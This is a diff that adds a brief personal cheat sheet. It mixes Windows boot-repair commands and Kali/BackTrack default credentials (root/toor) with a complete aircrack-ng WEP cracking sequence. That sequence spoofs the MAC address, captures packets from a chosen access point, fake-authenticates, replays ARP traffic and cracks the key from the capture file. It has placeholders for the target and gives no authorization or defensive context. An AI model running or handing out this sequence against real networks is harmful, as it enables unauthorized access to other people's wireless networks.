@@ -1,0 +1,23 @@
+GRUB ERROR 22
+Bootrec.exe /fixmbr
+Bootrec.exe /fixboot
+
+Fixvesa
+Startx
+root
+toor
+
+ifconfig eth0 up
+dhclient
+
+ifconfig -a
+
+airmon-ng stop wlan0
+ifconfig wlan0 down
+macchanger --mac 00:11:22:33:44:55 wlan0
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng -c {CHANNEL} -w pokemon -bssid {BSSID} wlan0
+aireplay-ng -1 0 -a {BSSID} -h 00:11:22:33:44:55 wlan0
+aireplay-ng -3 -b {BSSID} -h 00:11:22:33:44:55 wlan0
+aircrack-ng -b {BSSID} pokemon-01.cap
